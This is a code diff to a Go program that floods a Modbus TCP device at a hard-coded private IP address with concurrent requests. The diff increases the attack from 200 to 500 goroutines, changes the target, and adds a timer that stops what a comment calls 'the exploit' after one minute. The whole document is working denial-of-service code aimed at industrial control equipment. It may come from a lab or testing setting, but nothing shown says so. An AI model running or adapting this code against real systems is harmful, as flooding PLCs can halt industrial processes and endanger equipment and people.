@@ -2,9 +2,9 @@ package main
 
 import (
 	"fmt"
-	"time"
-
+	"os"
 	"sync"
+	"time"
 
 	"github.com/goburrow/modbus"
 )
@@ -22,14 +22,14 @@ func jammer(target modbus.Client) {
 		} else {
 			fmt.Println(results)
 		}
-		defer wait.Done()
 	}
+	defer wait.Done()
 
 }
 
 func main() {
 
-	handler := modbus.NewTCPClientHandler("192.168.16.164:502")
+	handler := modbus.NewTCPClientHandler("192.168.13.86:502")
 	handler.Timeout = 10 * time.Second
 
 	err := handler.Connect()
@@ -41,9 +41,17 @@ func main() {
 
 	client := modbus.NewClient(handler)
 
-	for i := 0; i < 200; i++ {
+	for i := 0; i < 500; i++ {
 		wait.Add(1)
 		go jammer(client)
 	}
+
+	//Runs the exploit for one minute then kills it
+	timer2 := time.NewTimer(1 * time.Minute)
+	go func() {
+		<-timer2.C
+		os.Exit(0)
+	}()
+
 	wait.Wait()
 }
